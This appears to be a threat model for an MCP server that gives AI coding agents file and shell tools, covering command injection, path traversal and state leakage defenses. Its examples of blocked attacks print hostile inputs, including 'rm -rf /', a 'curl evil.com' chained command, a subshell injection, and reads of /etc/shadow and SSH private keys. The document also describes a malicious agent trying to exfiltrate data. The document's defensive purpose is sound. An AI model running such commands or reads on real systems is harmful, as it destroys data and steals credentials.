# Threat Model

## Attack Surface Analysis

### 1. Command Injection (`smart_shell`)

**Attack vector:** Agent attempts to execute arbitrary commands

**Mitigations:**
- Allowlist-only approach (9 base commands)
- Subcommand validation for `git` and package managers
- Shell operator blocking (`|`, `&`, `;`, `>`, `<`, `` ` ``, `$()`)
- Dangerous pattern detection (`rm -rf`, `sudo`, `curl|`, `eval`)
- 500-character command length limit
- 15-second timeout
- 10MB output buffer

**Residual risk:** LOW
- Agent can only run diagnostic commands
- No write operations permitted
- No privilege escalation possible

**Example attacks blocked:**
```bash
git status; rm -rf /        # Shell operator blocked
npm test && curl evil.com   # Shell operator blocked
git commit -m "$(whoami)"   # Subshell blocked
sudo npm install            # Command not in allowlist
```

---

### 2. Path Traversal (All File Operations)

**Attack vector:** Agent attempts to read/write outside project root

**Mitigations:**
- `resolveSafePath()` validates all paths
- Relative path resolution from project root only
- Blocks `..` escapes
- Blocks absolute paths outside project
- System path denylist (`/etc`, `/var`, `/usr`, `/root`, etc.)

**Residual risk:** VERY LOW
- All file operations go through `resolveSafePath()`
- Multiple validation layers
- Symlinks followed but still validated

**Example attacks blocked:**
```javascript
smart_read({ path: '../../../etc/passwd' })        // Escapes project root
smart_read({ path: '/etc/shadow' })                 // Absolute path blocked
smart_read({ path: '/root/.ssh/id_rsa' })          // System path blocked
```

---

### 3. Repository State Leakage (`repo-safety.js`)

**Attack vector:** Local state (`.devctx/state.sqlite`) accidentally committed

**Mitigations:**
- Pre-commit hook blocks commits if state is staged
- `enforceRepoSafety()` checks before mutations
- Auto-adds `.devctx/` to `.gitignore` during init
- Warnings if state is tracked or staged

**Residual risk:** LOW
- User can manually bypass hook (`--no-verify`)
- User can manually `git add .devctx/`

**Recommended:**
- Always run `smart-context-init` in new projects
- Review `.gitignore` before first commit

---

### 4. Binary File Exposure

**Attack vector:** Agent reads binary files containing secrets or malicious data

**Mitigations:**
- First 8KB scanned for null bytes and control characters
- Binary files rejected before reading
- Dockerfile special case (text file but looks binary)

**Residual risk:** LOW
- Some binary formats might pass check
- Secrets in text files are still readable

**Recommended:**
- Don't store secrets in code
- Use environment variables or secret managers

---

### 5. Resource Exhaustion

**Attack vector:** Agent causes high CPU/memory usage

**Mitigations:**
- 15-second timeout on commands
- 10MB output buffer limit
- 1MB file size limit for indexing
- Skips `node_modules/`, `.git/`, `dist/`, `build/`
- Compressed output (5KB limit for shell)

**Residual risk:** MEDIUM
- Very large projects can cause high memory during indexing
- Agent can repeatedly call expensive operations

**Recommended:**
- Monitor `.devctx/state.sqlite` size
- Use `DEVCTX_CACHE_WARMING=false` on large projects
- Check metrics with `smart-context-report`

---

### 6. Agent Misuse

**Attack vector:** Malicious or buggy agent calls tools in unintended ways

**Mitigations:**
- All tools validate inputs
- No network access (local only)
- No write access to source code
- Audit trail in `.devctx/state.sqlite`

**Residual risk:** MEDIUM
- Agent can read any file in project
- Agent can run allowlisted commands repeatedly
- Agent can consume resources

**Recommended:**
- Only use MCP in trusted projects
- Review metrics regularly
- Monitor agent behavior

---

### 7. Secrets in Code

**Attack vector:** Agent reads secrets from source files

**Mitigations:**
- None (by design - the MCP must read code)

**Residual risk:** HIGH if secrets are in code

**Recommended:**
- Don't hardcode secrets
- Use environment variables
- Use secret managers (Vault, AWS Secrets Manager)
- Add secret files to `.gitignore`

---

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│ AI Agent (Untrusted)                                        │
│ - Can call any MCP tool                                     │
│ - Can read any file in project                              │
│ - Can run allowlisted commands                              │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ MCP Server (Trusted Boundary)                               │
│ - Validates all inputs                                      │
│ - Enforces allowlists                                       │
│ - Blocks dangerous operations                               │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Project Files (Trusted)                                     │
│ - Read access: All files in project                         │
│ - Write access: .devctx/ only                               │
│ - Execute access: Allowlisted commands only                 │
└─────────────────────────────────────────────────────────────┘
```

## Security Assumptions

This MCP assumes:

1. **Trusted project:** You only use the MCP in projects you trust
2. **No secrets in code:** Secrets are in environment variables, not files
3. **Updated dependencies:** Node.js and npm packages are current
4. **Git repository:** Project is a git repo with `.gitignore`
5. **Local execution:** MCP runs on your machine, not shared/remote

If any assumption is violated, security guarantees are reduced.

## Threat Scenarios

### Scenario 1: Malicious Agent

**Threat:** A compromised or malicious agent tries to exfiltrate data.

**Defense:**
- No network access → Cannot send data externally
- Path validation → Cannot read outside project
- Allowlist → Cannot run exfiltration tools

**Verdict:** ✅ Protected

---

### Scenario 2: Accidental Data Leak

**Threat:** Agent accidentally commits `.devctx/state.sqlite` with sensitive metrics.

**Defense:**
- Pre-commit hook blocks commits
- `enforceRepoSafety()` warns before mutations
- Auto-adds `.devctx/` to `.gitignore`

**Verdict:** ✅ Protected (with user discipline)

---

### Scenario 3: Command Injection

**Threat:** Agent crafts command to bypass allowlist.

**Defense:**
- Tokenizer parses commands correctly
- Blocklist for shell operators
- Dangerous pattern detection
- Subcommand validation

**Verdict:** ✅ Protected

---

### Scenario 4: Resource Exhaustion

**Threat:** Agent causes high CPU/memory usage.

**Defense:**
- Timeouts on all operations
- Output buffer limits
- File size limits
- Skips large directories

**Verdict:** ⚠️ Partially protected (monitor usage)

---

### Scenario 5: Secrets in Code

**Threat:** Agent reads secrets from `.env`, `credentials.json`, etc.

**Defense:**
- None (by design)

**Verdict:** ❌ Not protected (user responsibility)

---

## Security Testing

Run security tests:

```bash
npm test -- --grep "security|blocked|dangerous|path validation"
```

Expected results:
- ✅ 421 tests pass
- ✅ All dangerous commands blocked
- ✅ All path traversal attempts rejected
- ✅ All shell operators blocked

## Audit Trail

All tool calls are logged in `.devctx/state.sqlite`:

```sql
SELECT 
  tool_name,
  target,
  created_at,
  session_id,
  raw_tokens,
  compressed_tokens
FROM metrics_events
ORDER BY created_at DESC
LIMIT 20;
```

Or use the report script:

```bash
npm run report:metrics
```

## Security Roadmap

### v1.2.0 (Planned)
- [ ] Audit logging mode (`DEVCTX_AUDIT_LOG`)
- [ ] Custom allowlist configuration
- [ ] Rate limiting per tool
- [ ] Enhanced path validation (symlink depth)

### v1.3.0 (Planned)
- [ ] Sandboxed command execution
- [ ] Secret detection in files
- [ ] Resource usage limits per session

## Reporting Vulnerabilities

**Email:** fcp1978@hotmail.com

**Subject:** SECURITY: smart-context-mcp

**Include:**
- Description
- Steps to reproduce
- Potential impact
- Suggested fix (optional)

**Response time:** 48 hours

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
